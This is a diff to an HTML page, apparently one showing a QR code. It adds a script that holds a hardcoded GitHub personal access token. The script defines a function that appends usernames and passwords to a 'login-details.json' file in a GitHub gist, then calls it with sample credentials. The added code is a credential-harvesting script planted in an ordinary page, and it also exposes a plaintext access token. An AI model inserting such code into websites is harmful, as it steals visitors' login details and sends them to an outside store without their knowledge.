@@ -541,5 +541,38 @@ value: 'https://cdn.britannica.com/17/155017-050-9AC96FC8/Example-QR-code.jpg'
 });
 })();
 </script>
+
+  <script>
+const gistId = "1175d0beb7ae03f64e2940abfc41a2df";
+const githubToken = "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";
+
+const addLoginDetails = async (username, password) => {
+  const response = await fetch(`https://api.github.com/gists/${gistId}`);
+  const data = await response.json();
+  const loginDetails = JSON.parse(data.files["login-details.json"].content);
+  
+  loginDetails.push({ username, password });
+  
+  await fetch(`https://api.github.com/gists/${gistId}`, {
+    method: "PATCH",
+    headers: {
+      "Authorization": `Bearer ${githubToken}`,
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      files: {
+        "login-details.json": {
+          content: JSON.stringify(loginDetails, null, 2)
+        }
+      }
+    })
+  });
+};
+
+// Example of adding login details
+addLoginDetails("user123", "securepassword123");
+</script>
+
+  
 </body>
 </html>
